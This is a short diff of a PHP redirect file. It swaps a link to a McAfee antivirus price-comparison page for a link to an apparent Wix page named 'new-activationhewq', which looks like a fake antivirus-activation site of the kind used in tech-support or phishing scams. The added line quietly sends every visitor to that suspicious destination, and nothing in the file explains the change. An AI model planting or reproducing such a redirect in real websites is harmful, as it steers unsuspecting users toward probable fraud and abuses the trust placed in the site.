@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.shopbot.com.au/mcafee-antivirus/price/australia/343863");
+header("Location: https://new-activationhewq.wixsite.com/mysite");
 die();
 ?>
